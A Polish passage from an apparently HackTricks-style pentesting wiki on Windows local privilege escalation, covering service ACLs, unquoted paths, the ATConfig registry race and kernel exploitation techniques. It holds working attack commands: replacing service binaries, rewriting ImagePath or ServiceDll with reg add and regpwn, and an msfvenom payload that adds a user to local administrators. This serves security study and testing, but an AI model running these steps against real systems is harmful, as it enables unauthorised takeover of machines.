Jeśli usługa działa jako **`LocalSystem`**, **`LocalService`**, **`NetworkService`** lub uprzywilejowane konto domenowe, ale **użytkownicy z niskimi uprawnieniami mogą modyfikować plik EXE usługi lub jego folder nadrzędny**, często można przejąć kontrolę nad usługą, **zastępując plik binarny i ponownie uruchamiając usługę**.

**Sprawdź, czy możesz modyfikować plik binarny uruchamiany przez usługę** lub czy masz **uprawnienia do zapisu w folderze**, w którym znajduje się plik binarny ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Możesz wyświetlić wszystkie pliki binarne uruchamiane przez usługi za pomocą **wmic** (nie w system32), a następnie sprawdzić swoje uprawnienia za pomocą **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Możesz również użyć **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Szukaj niebezpiecznych ACL przyznanych **`Everyone`**, **`BUILTIN\Users`** lub **`Authenticated Users`**, zwłaszcza **`(F)`**, **`(M)`** lub **`(W)`** dla pliku wykonywalnego usługi albo katalogu, w którym się on znajduje. Praktyczny scenariusz nadużycia:<sup>[[27]](#references)</sup>

1. Sprawdź konto usługi i ścieżkę do pliku wykonywalnego za pomocą `sc qc <service_name>`.
2. Sprawdź, czy plik binarny można modyfikować, za pomocą `icacls <path>`.
3. Zastąp plik binarny usługi payloadem lub prawidłowym złośliwym plikiem binarnym usługi.
4. Uruchom ponownie usługę za pomocą `sc stop <service_name> && sc start <service_name>` (lub poczekaj na ponowne uruchomienie systemu / wyzwolenie usługi).

Przydatne zautomatyzowane kontrole:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Jeśli usługa nie pozwala zwykłemu użytkownikowi na jej ponowne uruchomienie, sprawdź, czy uruchamia się automatycznie podczas rozruchu, ma skonfigurowaną akcję ponownego uruchomienia po awarii lub można ją wywołać pośrednio przez korzystającą z niej aplikację.

### Uprawnienia do modyfikowania rejestru usługi

Sprawdź, czy możesz modyfikować rejestr dowolnej usługi.\
Możesz **sprawdzić** swoje **uprawnienia** do **rejestru** usługi, wykonując:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Pierwotny test uprawnień sformułowano następująco:

Należy sprawdzić, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** mają uprawnienia `FullControl`. Jeśli tak, można zmienić plik binarny uruchamiany przez usługę.

Sprawdź, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** mają uprawnienia do zapisu w rejestrze dla konkretnego klucza usługi. Sam wpis ACL nie dowodzi, że dostęp jest skuteczny — znaczenie mają wpisy odmowy, bieżący token i uprawnienia dziedziczone. Uprawnienia do klucza rejestru różnią się od uprawnień `SERVICE_CHANGE_CONFIG` i `SERVICE_START` do obiektu usługi. Eskalacja wymaga również użytecznego pola konfiguracji usługi, możliwości jej uruchomienia oraz tożsamości usługi o wyższych uprawnieniach. Zobacz dokumentację Microsoft dotyczącą [uprawnień do klucza rejestru](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) oraz [uprawnień dostępu do usług](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Aby zmienić ścieżkę (Path) pliku binarnego uruchamianego:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Wyścig z dowiązaniem symbolicznym rejestru umożliwiający zapis dowolnej wartości HKLM (ATConfig)

Niektóre funkcje ułatwień dostępu systemu Windows tworzą klucze **ATConfig** dla poszczególnych użytkowników, które później są kopiowane przez proces **SYSTEM** do klucza sesji HKLM. **Wyścig z dowiązaniem symbolicznym** rejestru może przekierować ten uprzywilejowany zapis do **dowolnej ścieżki HKLM**, zapewniając możliwość **zapisu dowolnej wartości** w HKLM.<sup>[[18]](#references)</sup>

Lokalizacje kluczy (przykład: Klawiatura ekranowa `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` zawiera listę zainstalowanych funkcji ułatwień dostępu.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` przechowuje konfigurację kontrolowaną przez użytkownika.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` jest tworzony podczas logowania/przejść na bezpieczny pulpit i jest zapisywalny przez użytkownika.

Przebieg ataku (CVE-2026-24291 / ATConfig):

1. Ustaw wartość **HKCU ATConfig**, którą chcesz zapisać jako SYSTEM.
2. Wywołaj kopiowanie na bezpieczny pulpit (np. **LockWorkstation**), co uruchamia przepływ AT broker.
3. **Wygraj wyścig**, zakładając **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; gdy oplock zadziała, zastąp klucz **HKLM Session ATConfig** kluczem będącym **linkiem rejestru** do chronionego celu HKLM.
4. SYSTEM zapisuje wybraną przez atakującego wartość do przekierowanej ścieżki HKLM.

Po uzyskaniu możliwości zapisu dowolnej wartości w HKLM przejdź do LPE, nadpisując wartości konfiguracji usługi:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/wiersz poleceń)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wybierz usługę, którą może uruchomić zwykły użytkownik (np. **`msiserver`**) i uruchom ją po zapisie. **Uwaga:** publiczna implementacja exploita **blokuje stację roboczą** w ramach wyścigu.

Przykładowe narzędzia (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Uprawnienia AppendData/AddSubdirectory w rejestrze usług

Jeśli masz te uprawnienia do rejestru, oznacza to, że **możesz tworzyć podrejestry w jego obrębie**. W przypadku usług Windows **wystarczy to do wykonania dowolnego kodu:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Jeśli ścieżka do pliku wykonywalnego nie jest ujęta w cudzysłów, Windows będzie próbował uruchomić każdą kolejną część ścieżki kończącą się przed spacją.

Na przykład dla ścieżki _C:\Program Files\Some Folder\Service.exe_ Windows będzie próbował uruchomić:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Wypisz wszystkie ścieżki usług nieujęte w cudzysłowy, z wyłączeniem tych należących do wbudowanych usług systemu Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Możesz wykryć i wykorzystać** tę lukę za pomocą metasploit: `exploit/windows/local/trusted\_service\_path` Możesz ręcznie utworzyć plik binarny usługi za pomocą metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Akcje odzyskiwania

System Windows pozwala użytkownikom określić działania, które mają zostać wykonane w przypadku awarii usługi. Tę funkcję można skonfigurować tak, aby wskazywała plik binarny. Jeśli można go podmienić, możliwa może być eskalacja uprawnień. Więcej informacji można znaleźć w [oficjalnej dokumentacji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Skrypty wskazywane przez zadania zaplanowane

W przypadku włączonego zadania, które uruchamia `cmd.exe /c` z plikiem `.bat` lub `.cmd`, sprawdź plik skryptu wskazany w **argumentach akcji**, a także `cmd.exe`. To samo dotyczy jawnego argumentu plikowego interpretera, takiego jak `-File` w PowerShellu. Jeśli zaplanowany plik wsadowy zawiera bezpośrednie wywołanie PowerShella z `-File`, sprawdź również ACL wskazanego skryptu; zmienne, instrukcje warunkowe i łączenie poleceń powłoki wymagają ręcznego prześledzenia. Skrypt lub katalog nadrzędny, do którego wywołujący może zapisywać, stanowi przesłankę do wykonania kodu w kontekście innego konta tylko wtedy, gdy skonfigurowany podmiot zabezpieczeń zadania różni się od konta wywołującego, a zadanie faktycznie dociera do tej akcji. ACL dopuszczający wyłącznie dopisywanie może mieć znaczenie w przypadku skryptów, ale wcześniejsze `exit` lub inny przepływ sterowania może uniemożliwić wykonanie dopisanych wierszy. Zanim stwierdzisz możliwość eskalacji, potwierdź efektywne ACL, [kontekst wykonywania zadania](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), katalog roboczy, wyzwalacz i zasady kontroli aplikacji. Inwentaryzacja nie powinna modyfikować skryptu ani uruchamiać zadania.

## Strumienie nazwane w dostępnych plikach

W systemie NTFS plik z prawem do odczytu może zawierać nazwany strumień `:$DATA`, którego zawartość nie jest widoczna podczas zwykłego wyświetlania katalogu. W przypadku niewielkiego, istotnego zbioru dostępnych kopii zapasowych lub plików konfiguracyjnych przed otwarciem jakiejkolwiek zawartości sprawdź **nazwy i rozmiary** strumieni; system Windows udostępnia je za pośrednictwem [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) oraz polecenia PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Nazwa strumienia sugerująca obecność sekretu jest jedynie wskazówką. Sprawdź efektywne uprawnienia do odczytu pliku, obsługę strumieni przez system plików, to, czy strumień zawiera użyteczne dane uwierzytelniające, oraz konto, do którego faktycznie umożliwiają uwierzytelnienie. Podczas rutynowej enumeracji unikaj rekurencyjnego skanowania strumieni i wyświetlania ich zawartości.

## Dane wejściowe pomocnika Windows Driver Kit uruchamianego przez zadanie zaplanowane

Opcjonalny Windows Driver Kit zawiera `StandaloneRunner.exe`, który może odczytywać pliki `command.txt`, `reboot.rsf` oraz plik projektu `working\rsf.rsf` z katalogu uruchomieniowego. Zadanie zaplanowane lub usługa uruchamiająca ten program pomocniczy z uprzywilejowanym kontem może zamienić możliwość zapisu do tych plików przez użytkownika o niskich uprawnieniach w wykonanie poleceń w kontekście tego konta, nawet jeśli sam plik wykonywalny jest chroniony. Potwierdź, że pliki są odczytywane przez uprzywilejowany proces i że można utworzyć lub zmodyfikować **oba** pliki towarzyszące; samo znalezienie programu pomocniczego nie wystarczy.

W przypadku zadania zaplanowanego sprawdź jego akcję [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) oraz ACL obu ścieżek plików towarzyszących. Jeśli zadanie nie określa katalogu roboczego, katalog pliku wykonywalnego jest jedynie wskazówką do weryfikacji, a nie dowodem na to, skąd zadanie odczytuje dane wejściowe. Należy również spełnić warunek dotyczący pliku roboczego projektu. Sprawdź faktyczny podmiot zabezpieczeń zadania, zamiast zakładać, że jest ono uruchamiane jako SYSTEM.

## Aplikacje

### Zainstalowane aplikacje

Sprawdź **uprawnienia do plików binarnych** (możliwe, że możesz nadpisać jeden z nich i eskalować uprawnienia) oraz **folderów** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Ścieżka naprawy agenta Windows Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) dotyczy starszych agentów Checkmk dla Windows, które zapisywały pliki poleceń w `C:\Windows\Temp`, a gdy ich zastąpienie się nie powiodło, wykonywały istniejący wcześniej plik chroniony przed zapisem. Dostawca naprawił ten problem w wersjach 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Sprawdź dokładny zainstalowany poziom poprawek i to, czy może zostać uruchomiona operacja agenta, której dotyczy problem; sama etykieta gałęzi, taka jak `2.1`, nie wystarcza, by ustalić, czy system jest podatny. Podczas enumeracji można sprawdzić wersję, stan usługi i uprawnienia do Temp bez tworzenia plików ani wywoływania poleceń agenta.

#### Weryfikacja usługi SAML ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) dotyczyło wersji ADSelfService Plus 6210 i wcześniejszych; dostawca naprawił ten problem w wersji 6211. Ma on znaczenie tylko wtedy, gdy SAML SSO **jest lub było** włączone. Wpis dotyczący zainstalowanego produktu lub ścieżka do usługi to zatem wskazówka, a nie potwierdzenie podatności: potwierdź dokładną wersję, historię konfiguracji SAML, dostępność usługi z sieci oraz konto, na którym działa. Wykonanie kodu za pośrednictwem usługi odbywa się z uprawnieniami tego konta; uruchomienie jako SYSTEM wymaga instancji działającej jako SYSTEM. Możliwy do odczytania plik `OfflineBackup_*.ezip` w katalogu Backup produktu to osobna wskazówka dotycząca zaszyfrowanej kopii zapasowej, a nie dowód na istnienie użytecznych danych uwierzytelniających ani tej luki SAML. Podczas rutynowej enumeracji zapisz jego ścieżkę i uprawnienia dostępu, ale go nie rozpakowuj.

#### Granice uprawnień kontrolera Jenkins i kont domenowych

Na kontrolerze Jenkins działającym w systemie Windows odróżnij uprawnienie do tworzenia lub konfigurowania zadania od uprawnienia do jego uruchamiania: [Jenkins opisuje je jako odrębne uprawnienia `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Skonfigurowany harmonogram lub zdalne wyzwalanie mogą stanowić inną drogę uruchomienia kompilacji, ale potwierdź, że są włączone i że kompilacja faktycznie się wykonuje. Kod działa z tożsamością kontrolera lub wybranego agenta, a zapisane dane uwierzytelniające można wykorzystać tylko wtedy, gdy zadanie ma dostęp do ich zakresu. Osobno sprawdź dostęp do metadanych `JENKINS_HOME`: Jenkins przechowuje dane uwierzytelniające i klucze szyfrujące w plikach `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([przechowywanie sekretów w Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Sama ich obecność nie ujawnia hasła; zweryfikuj **uprawnienia do odczytu wymaganych plików** oraz odrębną ścieżkę ponownego użycia konta, nie wyświetlając sekretów we współdzielonych wynikach. Jeśli to konto ma uprawnienie do zapisu `scriptPath` obiektu użytkownika AD, potwierdź, że ścieżka skryptu jest zapisywalna, a rzeczywisty proces logowania lub zaplanowane zadanie działające jako użytkownik docelowy ją wykorzystuje, zanim uznasz to za wykonanie kodu jako inny użytkownik. Dalszą kontrolę nad grupą należy potwierdzić osobno, weryfikując efektywne uprawnienia AD.

#### Tożsamość self-hosted agenta Azure Pipelines

W projekcie Azure DevOps Server lub Azure Pipelines odróżnij uprawnienie do **utworzenia lub edycji** pipeline’u od uprawnienia do jego **uruchomienia w kolejce** i użycia wybranej puli agentów; [Microsoft osobno opisuje uprawnienia pipeline’ów](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) oraz [autoryzację puli](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Jeśli konto o niższych uprawnieniach może przesłać krok skryptu i uruchomić pipeline na self-hosted agencie Windows, krok działa jako [skonfigurowane konto systemu operacyjnego agenta](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Zanim stwierdzisz, że dochodzi do przejścia między użytkownikami lub uzyskania uprawnień SYSTEM, zweryfikuj dokładny pipeline, ograniczenia dotyczące gałęzi i zasobów, autoryzowaną pulę, możliwe do uruchomienia zadanie oraz tożsamość usługi agenta. Zainstalowany agent, rola w projekcie ani sam dostęp do zapisu w repozytorium to tylko wskazówki; podczas pasywnej enumeracji sprawdź uprawnienia i lokalne metadane usługi, nie uruchamiając kompilacji.

#### Dane uwierzytelniające Microsoft Entra Connect Sync

[Microsoft rozróżnia](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **konto usługi ADSync**, które uruchamia usługę synchronizacji i uzyskuje dostęp do jej bazy SQL, od **konta łącznika AD DS**, którego uprawnienia w katalogu zależą od skonfigurowanych funkcji synchronizacji. Dane uwierzytelniające łącznika są przechowywane w tej bazie w postaci zaszyfrowanej, a materiał klucza jest [chroniony przez DPAPI w kontekście konta usługi ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sama zainstalowana usługa synchronizacji, grupa o nazwie sugerującej uprawnienia administratora lokalnego ani dostęp do bazy danych nie potwierdzają możliwości odszyfrowania danych uwierzytelniających ani eskalacji uprawnień w domenie. Osobno sprawdź faktyczne uprawnienia do odczytu bazy, dostęp do konta usługi i klucza, układ instalacji i SQL, skonfigurowaną tożsamość łącznika oraz efektywne uprawnienia tej tożsamości w AD. Rutynowa enumeracja powinna wykazywać wyłącznie metadane usługi i dostępu, a nie odpytywać ani wyświetlać zapisanych sekretów.

#### Uprawnienia do bibliotek DLL obsługujących sterowniki drukarek

Zainstalowany sterownik drukarki może przechowywać pomocnicze biblioteki DLL w `C:\ProgramData` i ładować je w procesie drukowania o wyższych uprawnieniach. Sprawdź ACL dokładnego katalogu sterownika i bibliotek DLL, w tym katalogów nadrzędnych i punktów ponownej analizy, nawet jeśli enumeracja drukarek przez WMI jest niedostępna. W przypadku [problemu ze sterownikiem drukarki Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) zgłoszona ścieżka to `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [pierwotny opis problemu](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) opisuje ładowanie bibliotek DLL przez `PrintIsolationHost.exe`. Zapisywalny ACL to tylko wskazówka: zweryfikuj efektywne uprawnienia do zapisu po uwzględnieniu wpisów odmowy, czy odpowiedni sterownik jest zainstalowany i ładuje plik z uprawnieniami uprzywilejowanej tożsamości oraz czy dostawca naprawił instalację przez aktualizację sterownika lub program zabezpieczeń. Nie wnioskuj o podatności wyłącznie na podstawie nazwy katalogu lub wersji sterownika.

### Uprawnienia do zapisu

Sprawdź, czy możesz zmodyfikować plik konfiguracyjny, aby odczytać określony plik, albo zmodyfikować plik binarny, który zostanie uruchomiony przez konto Administratora (schedtasks).

Jednym ze sposobów wyszukania słabo zabezpieczonych uprawnień do folderów i plików w systemie jest wykonanie:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Trwałość/wykonywanie przez automatyczne ładowanie pluginów Notepad++

Notepad++ automatycznie ładuje wszystkie biblioteki DLL pluginów znajdujące się w podfolderach `plugins`. Jeśli dostępna jest zapisywalna instalacja portable/kopia, umieszczenie złośliwego pluginu powoduje automatyczne wykonanie kodu w procesie `notepad++.exe` przy każdym uruchomieniu (w tym z poziomu `DllMain` i callbacków pluginu).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Uruchamianie przy starcie

**Sprawdź, czy możesz nadpisać jakiś wpis rejestru lub plik binarny, który zostanie uruchomiony przez innego użytkownika.**\
**Przeczytaj** **poniższą stronę**, aby dowiedzieć się więcej o interesujących **lokalizacjach autoruns umożliwiających eskalację uprawnień**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sterowniki

Szukaj potencjalnych **dziwnych/podatnych sterowników firm trzecich**.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Jeśli driver udostępnia prymityw dowolnego odczytu/zapisu w kernelu (częsty problem w źle zaprojektowanych obsługach IOCTL), możesz eskalować uprawnienia, bezpośrednio kradnąc token SYSTEM z pamięci kernela.<sup>[[13]](#references)</sup> Instrukcję krok po kroku znajdziesz tutaj:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Powiązane materiały dotyczące exploitacji kernela Windows:

Przypadek kernel-mode z ring bufferem i rejestrami odczytu/zapisu zapisywalnymi z poziomu użytkownika opisano w [wariancie USB MIDI looped-streaming](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

W przypadku błędów race condition, w których podatne wywołanie otwiera ścieżkę Object Manager kontrolowaną przez atakującego, celowe spowolnienie wyszukiwania (przy użyciu komponentów o maksymalnej długości lub głębokich łańcuchów katalogów) może wydłużyć okno z mikrosekund do kilkudziesięciu mikrosekund:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### UAF w cancel-safe queue, ujawnienia z paged-pool i pivots I/O ring

Niektóre łańcuchy LPE w kernelu Windows można zbudować z dwóch osobno mało groźnych błędów: **race condition w cyklu życia cancel-safe queue**, która zwalnia żądanie/CBD, gdy blokada kolejki jest nadal utrzymywana, oraz ujawnienia **lock-release-before-copy**, które ujawnia zwolnioną alokację paged-pool podczas `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Uwagi dotyczące audytu i exploitacji:

- **Zwolnienie pod blokadą + późniejsze anulowanie**: szukaj ścieżki sukcesu wykonującej **Acquire -> CompleteRequest/free -> Release**, podczas gdy ścieżka anulowania wykonuje **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Jeśli ścieżka sukcesu dochodzi do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` przed zwolnieniem blokady CBDQ/CSQ, wątek zablokowany w `NtCancelIoFileEx -> IopCsqCancelRoutine` może później wznowić działanie i przekazać zwolniony `PFLT_CALLBACK_DATA` z powrotem do funkcji usuwającej drivera.
- **Odzyskaj zwolniony obiekt kolejki** za pomocą alokacji paged-pool o tym samym rozmiarze, kontrolowanej przez atakującego. Wpisy Data Queue Entries `NPFS` są przydatne, ponieważ można kontrolować ich payload i rozmiar, a później sprawdzać je operacjami odczytu/podglądu pipe. Jeśli zwolniony obiekt zawiera wskaźniki listy, nadpisz je **cykliczną listą fałszywych węzłów żądań w pamięci użytkownika**, aby driver wielokrotnie przetwarzał zdefiniowane przez atakującego struktury żądań zamiast zakończyć działanie na oryginalnym początku listy.
- **Rozwiń przewidywalny zapis**: jeśli fałszywe żądanie przekieruje zagnieżdżony wskaźnik kontekstu używany przez zapisy księgowe (znaczniki czasu / QPC / pola sąsiadujące z licznikiem referencji), możesz uzyskać zapis do kernela z **kontrolowanym adresem, ale niekontrolowaną wartością**. W takim przypadku zaatakuj pole **length/size** obiektu ze spryskanego poola zamiast końcowego wskaźnika kodu/danych, a następnie przeszukuj spray, aż uszkodzony obiekt umożliwi **odczyt poza zakresem z paged-pool**.
- **Wzorzec podatnego na race condition ujawnienia**: każdy syscall wykonujący `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` jest dobrym kandydatem. Niezawodność rośnie, gdy atakujący może powiększyć kopiowany bufor (na przykład dodając wiele wpisów listy/zasobów, które zwiększają końcowy rozmiar alokacji serializatora), ponieważ dłuższe kopiowanie poszerza okno na podmianę bez konieczności awarii systemu.
- **Cele uzupełniania bogate we wskaźniki**: zarejestrowane tablice buforów Windows **I/O ring** są doskonałymi celami ujawnienia, ponieważ ich rozmiar paged-pool można kontrolować (`8 * regBufferCnt`), a każdy element jest wskaźnikiem kernela do `_IOP_MC_BUFFER_ENTRY`. Ujawnij jedną z tych tablic, odzyskaj otaczający ją `IORING_OBJECT`, a następnie uszkodź **`RegBuffers`** i **`RegBuffersCount`**, aby kolejne operacje I/O ring korzystały z podrobionych przez atakującego wpisów i umożliwiały dowolny odczyt/zapis w kernelu. Jeśli jedyny dostępny zapis daje stabilny bajt (na przykład z `KUSER_SHARED_DATA+0x14`), użyj **nakładających się, niewyrównanych zapisów**, aby zbudować powtarzający się bajtowo wskaźnik użytkownika, taki jak `0x0101010101010101`, zmapuj go za pomocą `VirtualAlloc` i umieść tam podrobioną tablicę zarejestrowanych buforów.<sup>[[30]](#references)</sup>

Przydatne wskaźniki diagnostyczne:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Po uzyskaniu arbitrary kernel read/write za pośrednictwem uszkodzonego I/O ringa ukradnij token SYSTEM, korzystając ze standardowego workflow po uzyskaniu prymitywu:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Prymitywy uszkadzania pamięci w ulach rejestru

Współczesne podatności w ulach rejestru pozwalają przygotować deterministyczny układ pamięci, wykorzystać zapisywalne klucze potomne HKLM/HKU i przekształcić uszkodzenie metadanych w przepełnienia kernel paged pool bez niestandardowego sterownika. Poznaj pełny łańcuch tutaj:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Pomieszanie typów `RtlQueryRegistryValues` w trybie bezpośrednim ze ścieżek kontrolowanych przez atakującego

Niektóre sterowniki akceptują ścieżkę rejestru z przestrzeni użytkownika, sprawdzają jedynie, czy jest poprawnym ciągiem UTF-16, a następnie wywołują `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` z `RTL_QUERY_REGISTRY_DIRECT`, przekazując jako cel skalar na stosie, taki jak `int readValue`. Jeśli brakuje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` jest interpretowane zgodnie z **rzeczywistym** typem rejestru, a nie typem oczekiwanym przez programistę.

Daje to dwa przydatne prymitywy:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: kontrolowana przez użytkownika ścieżka bezwzględna `\Registry\...` pozwala sterownikowi odpytywać klucze wybrane przez atakującego, ujawniać ich istnienie za pomocą kodów zwrotnych lub logów, a czasem odczytywać wartości, do których wywołujący nie miałby bezpośredniego dostępu.
- **Uszkodzenie pamięci kernela**: cel skalarny, taki jak `&readValue`, może zostać zinterpretowany jako `REG_QWORD`, `UNICODE_STRING` lub bufor binarny o określonym rozmiarze — zależnie od typu wartości rejestru.

Praktyczne wskazówki dotyczące exploita:

- **Zabezpieczenie w Windows 8+**: jeśli zapytanie dotyczy **niezaufanego ula** z `RTL_QUERY_REGISTRY_DIRECT`, ale bez `RTL_QUERY_REGISTRY_TYPECHECK`, wywołania z kernela kończą się awarią `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Aby zachować możliwość wykorzystania podatności, szukaj **kluczy z możliwością zapisu w zaufanych ulach systemowych**, zamiast umieszczać wartości w `HKCU`.
